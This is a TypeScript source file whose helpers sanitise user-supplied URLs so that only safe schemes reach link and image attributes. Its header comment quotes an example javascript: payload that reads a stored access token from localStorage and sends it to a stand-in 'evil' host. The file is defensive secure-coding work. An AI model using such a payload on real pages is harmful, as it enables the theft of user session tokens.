// Safe-URL helpers. User-supplied URLs (elon locationUrl, chat attachment urls)
// must never be placed in an href/src verbatim: a value like
// `javascript:fetch('//evil/?t='+localStorage.getItem('ib-access'))` would run
// on click and exfiltrate the stored token. These helpers allow only safe
// schemes and return a harmless fallback otherwise.

const SAFE_SCHEMES = ["http:", "https:", "mailto:", "tel:"];

/**
 * Returns the URL only if it parses and uses a safe scheme; otherwise returns
 * undefined. Use for hrefs that open in a new tab / external navigation.
 */
export function safeHref(raw?: string | null): string | undefined {
  if (!raw) return undefined;
  const v = raw.trim();
  // Allow site-relative links (start with "/" but not "//", which is protocol-relative).
  if (v.startsWith("/") && !v.startsWith("//")) return v;
  try {
    const u = new URL(v);
    if (SAFE_SCHEMES.includes(u.protocol.toLowerCase())) return u.href;
  } catch {
    // not an absolute URL
  }
  return undefined;
}

/**
 * Returns the URL only if it is a safe http(s) resource, for use in <img src>
 * and similar. Rejects javascript:, data:, blob: (except explicit allowances)
 * and anything that doesn't parse.
 */
export function safeImageSrc(raw?: string | null): string | undefined {
  if (!raw) return undefined;
  const v = raw.trim();
  if (v.startsWith("/") && !v.startsWith("//")) return v;
  try {
    const u = new URL(v);
    if (u.protocol === "http:" || u.protocol === "https:") return u.href;
  } catch {
    // ignore
  }
  return undefined;
}
